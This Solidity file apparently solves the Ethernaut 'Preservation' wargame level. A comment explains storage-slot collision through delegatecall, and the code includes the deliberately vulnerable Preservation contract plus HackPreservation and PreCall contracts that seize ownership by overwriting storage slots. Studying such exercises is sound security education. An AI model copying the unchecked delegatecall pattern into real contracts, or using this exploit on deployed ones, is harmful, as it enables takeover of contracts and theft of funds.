// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
  `delegatecall` is a low level fn that calls other contract functions using current contract's
  state variable slots.

  Solidity stores its variables in fixed slots of 32 bytes. When a variable takes less space than the
  designated 32 bytes, the remaining remains empty to be taken up by the next variable. But if the next
  variable cannot take the remaining space in that slot, then that remaining space continues to be empty
  and the new variable takes other slot.

  An `address` type is of 20 bytes, thus it doesn't take complete slot of 32 bytes but all the three variables
  are of address type which cannot be accomodated in one slot, hence, all three takes three different
  32 bytes slots.

  For Ex: Here, `Preservation` calls timeZone1 and timeZone2 library -> TimeZone library sets variable
  in the first slot.
  In Preservation contract, timeZoneLibrary1 -> Slot 1, timeZoneLibrary2 -> Slot 2, Owner -> Slot 3
  To take the ownership of the contract, we somehow need a similar contract that sets variable in the slot.

  `HackPreservation` is a simple contract designed to set variable in the third slot of the contract.
  Now, we call `setSecondTime` fn which sets first slot of `Preservation` contract i.e. `timeZoneLibrary1`
  variable to the `HackPreservation` contract's address. Now, when we call `setFirstTime` fn, we will set
  the third slot in the `Preservation` contract which is the owner variable.
 */
contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract HackPreservation {
    address public a;
    address public b;
    address public c;

    function setTime(uint256 temp) public {
        c = address(temp);
    }
}

contract PreCall {
    Preservation p;

    constructor(address pp) public {
        p = Preservation(pp);
    }

    function callSetTime1(uint256 a) public {
        p.setFirstTime(a);
    }

    function callSecondTime2(uint256 b) public {
        p.setSecondTime(b);
    }
}